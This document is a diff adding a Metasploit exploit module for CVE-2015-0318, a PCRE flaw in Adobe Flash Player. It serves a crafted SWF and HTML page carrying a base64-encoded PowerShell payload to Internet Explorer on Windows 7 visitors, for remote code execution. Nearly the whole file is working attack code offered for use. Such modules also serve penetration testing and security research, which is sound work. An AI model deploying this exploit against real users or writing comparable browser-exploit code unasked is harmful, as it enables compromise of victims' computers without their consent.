@@ -1,0 +1,118 @@
+##
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core'
+
+class Metasploit3 < Msf::Exploit::Remote
+  Rank = NormalRanking
+
+  CLASSID =  'd27cdb6e-ae6d-11cf-96b8-444553540000'
+
+  include Msf::Exploit::Powershell
+  include Msf::Exploit::Remote::BrowserExploitServer
+
+  def initialize(info={})
+    super(update_info(info,
+      'Name'           => "Adobe Flash Player PCRE Regex Vulnerability",
+      'Description'    => %q{
+        This module exploits a vulnerability found in Adobe Flash Player. A compilation logic error
+        in the PCRE engine, specifically in the handling of the \c escape sequence when followed by
+        a multi-byte UTF8 character, allows arbitrary execution of PCRE bytecode.
+      },
+      'License'        => MSF_LICENSE,
+      'Author'         =>
+        [
+          'Mark Brand', # Found vuln
+          'sinn3r'      # MSF
+        ],
+      'References'     =>
+        [
+          [ 'CVE', '2015-0318' ],
+          [ 'URL', 'http://googleprojectzero.blogspot.com/2015/02/exploitingscve-2015-0318sinsflash.html' ],
+          [ 'URL', 'https://code.google.com/p/google-security-research/issues/detail?id=199' ]
+        ],
+      'Payload'        =>
+        {
+          'Space' => 1024,
+          'DisableNops' => true
+        },
+      'DefaultOptions'  =>
+        {
+          'Retries' => true
+        },
+      'Platform'       => 'win',
+      'BrowserRequirements' =>
+        {
+          :source  => /script|headers/i,
+          :clsid   => "{#{CLASSID}}",
+          :method  => "LoadMovie",
+          :os_name => OperatingSystems::Match::WINDOWS_7,
+          :ua_name => Msf::HttpClients::IE,
+          # Ohter versions are vulnerable but .235 is the one that works for me pretty well
+          # So we're gonna limit to this one for now. More validation needed in the future.
+          :flash   => lambda { |ver| ver == '16.0.0.235' }
+        },
+      'Targets'        =>
+        [
+          [ 'Automatic', {} ]
+        ],
+      'Privileged'     => false,
+      'DisclosureDate' => "Nov 25 2014",
+      'DefaultTarget'  => 0))
+  end
+
+  def exploit
+    # Please see data/exploits/CVE-2015-0318/ for source,
+    # that's where the actual exploit is
+    @swf = create_swf
+    super
+  end
+
+  def on_request_exploit(cli, request, target_info)
+    print_status("Request: #{request.uri}")
+
+    if request.uri =~ /\.swf$/
+      print_status("Sending SWF...")
+      send_response(cli, @swf, {'Content-Type'=>'application/x-shockwave-flash', 'Pragma' => 'no-cache'})
+      return
+    end
+
+    print_status("Sending HTML...")
+    tag = retrieve_tag(cli, request)
+    profile = get_profile(tag)
+    profile[:tried] = false unless profile.nil? # to allow request the swf
+    send_exploit_html(cli, exploit_template(cli, target_info), {'Pragma' => 'no-cache'})
+  end
+
+  def exploit_template(cli, target_info)
+    swf_random = "#{rand_text_alpha(4 + rand(3))}.swf"
+    target_payload = get_payload(cli, target_info)
+    psh_payload = cmd_psh_payload(target_payload, 'x86', {remove_comspec: true})
+    b64_payload = Rex::Text.encode_base64(psh_payload)
+
+    html_template = %Q|<html>
+    <body>
+    <object classid="clsid:#{CLASSID}" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab" width="1" height="1" />
+    <param name="movie" value="<%=swf_random%>" />
+    <param name="allowScriptAccess" value="always" />
+    <param name="FlashVars" value="sh=<%=b64_payload%>" />
+    <param name="Play" value="true" />
+    <embed type="application/x-shockwave-flash" width="1" height="1" src="<%=swf_random%>" allowScriptAccess="always" FlashVars="sh=<%=b64_payload%>" Play="true"/>
+    </object>
+    </body>
+    </html>
+    |
+
+    return html_template, binding()
+  end
+
+  def create_swf
+    path = ::File.join( Msf::Config.data_directory, "exploits", "CVE-2015-0318", "Main.swf" )
+    swf = ::File.open(path, 'rb') { |f| swf = f.read }
+
+    swf
+  end
+
+end
